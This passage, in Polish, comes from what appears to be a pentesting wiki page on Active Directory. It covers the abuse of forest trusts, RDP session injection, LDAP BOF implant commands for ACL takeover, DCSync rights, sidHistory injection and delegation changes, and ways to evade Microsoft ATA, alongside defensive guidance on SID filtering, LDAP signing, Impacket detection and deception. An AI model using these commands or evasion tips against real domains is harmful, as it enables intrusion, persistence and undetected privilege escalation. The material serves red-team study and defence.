external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu — jednokierunkowa (wychodząca)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

W tym scenariuszu **Twoja domena** **ufa** pewnym **podmiotom**, przyznając im **uprawnienia** w **innych domenach**.

Jednak gdy domena jest **ufana** przez domenę ufającą, domena ufana **tworzy użytkownika** o **przewidywalnej nazwie**, którego **hasłem jest hasło zaufania**. Oznacza to, że można **uzyskać dostęp do konta użytkownika w domenie ufającej, by dostać się do domeny ufanej**, wyliczyć jej zasoby i spróbować eskalować uprawnienia:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem na naruszenie bezpieczeństwa domeny ufanej jest znalezienie [**zaufanego łącza SQL**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** niż relacja zaufania między domenami (co nie zdarza się często).

Kolejny sposób na naruszenie bezpieczeństwa domeny ufanej polega na zaczekaniu na maszynie, do której **użytkownik z domeny ufanej może się zalogować** przez **RDP**. Następnie atakujący może wstrzyknąć kod do procesu sesji RDP i **uzyskać stamtąd dostęp do domeny źródłowej ofiary**.\
Co więcej, jeśli **ofiara zamontowała swój dysk twardy**, atakujący może z poziomu procesu **sesji RDP** umieścić **backdoory** w **folderze autostartu na dysku twardym**. Ta technika nazywa się **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ograniczanie nadużyć związanych z zaufaniem między domenami

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w relacjach zaufania między lasami ogranicza SID Filtering, domyślnie aktywowany dla wszystkich relacji zaufania między lasami. Opiera się to na założeniu, że relacje zaufania wewnątrz lasu są bezpieczne, a granicą bezpieczeństwa jest las, a nie domena, zgodnie ze stanowiskiem Microsoftu.
- Jest jednak pewien haczyk: SID filtering może zakłócać działanie aplikacji i dostęp użytkowników, dlatego bywa wyłączany.

### **Selective Authentication:**

- W przypadku relacji zaufania między lasami zastosowanie Selective Authentication gwarantuje, że użytkownicy z tych dwóch lasów nie są uwierzytelniani automatycznie. Zamiast tego użytkownicy muszą otrzymać jawne uprawnienia, aby uzyskiwać dostęp do domen i serwerów w domenie lub lesie ufającym.
- Należy pamiętać, że te środki nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani atakami na konto zaufania.

[**Więcej informacji o zaufaniach między domenami w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Nadużycia AD oparte na LDAP z implantów działających na hoście

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponownie implementuje podstawowe operacje LDAP w stylu bloodyAD jako x64 Beacon Object Files, działające w całości wewnątrz implantu na hoście (np. Adaptix C2). Operatorzy kompilują pakiet poleceniem `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z beacona. Cały ruch wykorzystuje bieżący kontekst zabezpieczeń logowania przez LDAP (389) z podpisywaniem/szyfrowaniem albo LDAPS (636) z automatycznym zaufaniem do certyfikatu, więc nie są potrzebne proxy socks ani artefakty na dysku.<sup>[[4]](#references)</sup>

### Wyliczanie LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` rozwiązują krótkie nazwy/ścieżki OU do pełnych DN i zrzucają odpowiadające im obiekty.
- `get-object`, `get-attribute` i `get-domaininfo` pobierają dowolne atrybuty (w tym deskryptory zabezpieczeń), a także metadane lasu/domeny z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` udostępniają bezpośrednio z LDAP kandydatów do roasting, ustawienia delegowania oraz istniejące deskryptory [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` i `get-writable --detailed` analizują DACL, aby wyświetlić podmioty uprawnione, uprawnienia (GenericAll/WriteDACL/WriteOwner/zapis atrybutów) oraz dziedziczenie, wskazując od razu cele do eskalacji uprawnień przez ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitives zapisu LDAP do eskalacji uprawnień i utrzymania dostępu

- BOF-y do tworzenia obiektów (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi przygotować nowe podmioty lub konta komputerów w dowolnych OU, do których ma uprawnienia. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` pozwalają bezpośrednio przejąć kontrolę nad celami, gdy zostaną znalezione uprawnienia zapisu właściwości.
- Polecenia skoncentrowane na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, zamieniają WriteDACL/WriteOwner dowolnego obiektu AD na możliwość resetowania haseł, kontrolowania członkostwa w grupach lub uzyskania uprawnień replikacji DCSync — bez pozostawiania śladów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegowanie, roasting i nadużycia Kerberos

- `add-spn`/`set-spn` natychmiast umożliwiają Kerberoasting przejętego użytkownika; `add-asreproastable` (zmiana UAC) oznacza konto jako podatne na AS-REP roasting, bez zmiany hasła.
- Makra delegowania (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modyfikują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` bezpośrednio z beacona, umożliwiając ścieżki ataku z delegowaniem ograniczonym/nieograniczonym/RBCD i eliminując potrzebę użycia zdalnego PowerShell lub RSAT.

### Wstrzykiwanie sidHistory, przenoszenie obiektów OU i kształtowanie powierzchni ataku

- `add-sidhistory` wstrzykuje uprzywilejowane SID-y do historii SID kontrolowanego podmiotu (zobacz [Wstrzykiwanie SID-History](sid-history-injection.md)), zapewniając dyskretne dziedziczenie dostępu w całości przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenieść zasoby do OU objętego delegowanymi uprawnieniami przed użyciem `set-password`, `add-groupmember` lub `add-spn`. Zobacz [Przenoszenie do OU i dziedziczone uprawnienia](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions), aby poznać uprawnienia do przenoszenia i sprawdzania dziedziczenia.
- Precyzyjnie ukierunkowane polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) umożliwiają szybkie wycofanie zmian po zebraniu poświadczeń lub ustanowieniu trwałego dostępu przez operatora, minimalizując telemetrię.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Kilka ogólnych metod obrony

[**Dowiedz się więcej o ochronie poświadczeń.**](../stealing-credentials/credentials-protections.md)

### **Środki ochrony poświadczeń**

- **Ograniczenia dla Domain Admins**: Zaleca się, aby Domain Admins mogli logować się wyłącznie na kontrolerach domeny i nie używali swoich kont na innych hostach.
- **Uprawnienia kont usług**: Usługi nie powinny działać z uprawnieniami Domain Admin (DA), aby zachować bezpieczeństwo.
- **Ograniczenie czasu posiadania uprawnień**: Czas wykonywania zadań wymagających uprawnień DA powinien być ograniczony. Można to osiągnąć za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ograniczanie LDAP relay**: Przeprowadź audyt identyfikatorów zdarzeń 2889/3074/3075, a następnie wymuś podpisywanie LDAP i channel binding LDAPS na kontrolerach domeny/klientach, aby blokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Odciski protokołów aktywności Impacket

Aby wykrywać typowe techniki działania w AD, **nie polegaj wyłącznie na artefaktach kontrolowanych przez operatora**, takich jak zmienione nazwy plików binarnych, nazwy usług, tymczasowe pliki batch czy ścieżki wyjściowe. Ustal wzorce ruchu, jaki tworzą legalne klienty Windows korzystające z [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI, a następnie szukaj **osobliwości implementacyjnych**, które pozostają nawet po edycji przez operatora plików `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` lub `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Kandydaci o wysokiej pewności do samodzielnego wykrywania** (po sprawdzeniu ich względem własnej bazy wzorców):
  - Uwierzytelnione DCE/RPC z użyciem `auth_context_id = 79231 + ctx_id`
  - Dopełnianie uwierzytelniania DCE/RPC bajtami `0xff`
  - Wiązania LDAP Kerberos umieszczające surowy Kerberos `AP-REQ` bezpośrednio w `mechToken` SPNEGO
  - Żądania negocjacji SMB2/3 z wartościami `ClientGuid` przypominającymi tekst ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` używające niestandardowej przestrzeni nazw `//./root/cimv2`
  - Zakodowane na stałe wartości nonce Kerberos
- **Lepsze jako cechy do korelacji i punktacji**:
  - Ubogie lub zduplikowane listy etype Kerberos, nietypowe/brakujące `PA-DATA` lub kolejność etype w TGS-REQ różniąca się od natywnego Windows
  - Wiadomości NTLM Type 1 bez informacji o wersji lub wiadomości Type 3 z pustymi nazwami hostów
  - Surowy NTLMSSP przesyłany przez DCE/RPC zamiast SPNEGO, brak trailerów weryfikacyjnych DCE/RPC lub niezgodności OID SPNEGO/Kerberos
  - Kilka takich cech z tego samego hosta/użytkownika/sesji/przedziału czasu jest znacznie bardziej miarodajnych niż pojedyncze słabe pole
- **Używaj jako dodatkowych informacji, a nie samodzielnych alertów**:
  - Domyślne nazwy plików, ścieżki wyjściowe, losowe nazwy usług, tymczasowe nazwy plików batch, domyślne nazwy kont komputerów oraz ciągi HTTP/WebDAV/RDP/MSSQL charakterystyczne dla narzędzi
  - Operatorzy mogą je łatwo zmienić; najlepiej wykorzystać je do wyjaśnienia, dlaczego podejrzany jest klaster obejmujący wiele protokołów
- **Uwagi operacyjne**:
  - Niektóre z tych sygnałów wymagają odszyfrowanego ruchu, [analizy PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW lub widoczności po stronie usługi
  - Przed przekształceniem sygnałów w alerty sprawdź je w odniesieniu do klientów Samba/Linux, urządzeń i starszego oprogramowania
  - Wraz ze wzrostem pewności co do bazy wzorców przenoś wykrycia od dodatkowych informacji -> threat huntingu -> alertowania

### **Wdrażanie technik deception**

- Wdrażanie deception polega na zastawianiu pułapek, takich jak konta użytkowników lub komputerów-przynęty, z cechami takimi jak niegasnące hasła lub oznaczenie jako Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi uprawnieniami lub dodawanie ich do grup o wysokich uprawnieniach.<sup>[[2]](#references)</sup>
- Praktyczny przykład wykorzystuje narzędzia takie jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej informacji o wdrażaniu technik deception można znaleźć na stronie [Deploy-Deception w GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identyfikowanie deception**

- **Obiekty użytkowników**: Podejrzane oznaki obejmują nietypowy ObjectSID, rzadkie logowania, daty utworzenia i niewielką liczbę nieudanych prób podania hasła.
- **Ogólne oznaki**: Porównanie atrybutów potencjalnych obiektów-przynęt z atrybutami prawdziwych obiektów może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w identyfikowaniu takich pułapek.

### **Omijanie systemów wykrywania**

- **Omijanie wykrywania przez Microsoft ATA**:
  - **Wyliczanie użytkowników**: Unikanie wyliczania sesji na kontrolerach domeny, aby zapobiec wykryciu przez ATA.
  - **Podszywanie się pod użytkownika przy użyciu biletu**: Używanie kluczy **aes** do tworzenia biletów pomaga uniknąć wykrycia, ponieważ nie dochodzi do obniżenia poziomu zabezpieczeń do NTLM.
  - **Ataki DCSync**: Zaleca się przeprowadzanie ich z hosta innego niż kontroler domeny, aby uniknąć wykrycia przez ATA, ponieważ bezpośrednie wykonanie ataku z kontrolera domeny wywoła alerty.

## References

- [1] [Przewodnik po atakowaniu zaufania domen](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Fałszowanie zaufania na potrzeby deception w Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin do Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Kolekcja LDAP BOF – zestaw narzędzi LDAP działający w pamięci do eksploatacji Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Wykorzystanie hashy NTLM jako listy słów](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (laboratorium AD NetExec) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – analiza Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: przejmowanie kont Active Directory przez Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Jak zarządzać zmianami w połączeniach bezpiecznego kanału Netlogon związanymi z CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Podróż przez zapomniane interfejsy Null Session i MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Filtr SID jako granica bezpieczeństwa między domenami? (Część 4) - Badanie omijania filtrowania SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Filtr SID jako granica bezpieczeństwa między domenami? (Część 5) - Atak zaufania Golden GMSA - z domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Filtr SID jako granica bezpieczeństwa między domenami? (Część 6) - Atak zaufania przez zmianę schematu - z domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA z ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacja z administratorów domeny podrzędnej do administratorów przedsiębiorstwa w 5 minut przez nadużycie AD CS — dalszy ciąg](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE w zanadrzu: projektowanie backdoorów DACL w Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Kod źródłowy modułu NetExec pre2k](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atrybut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
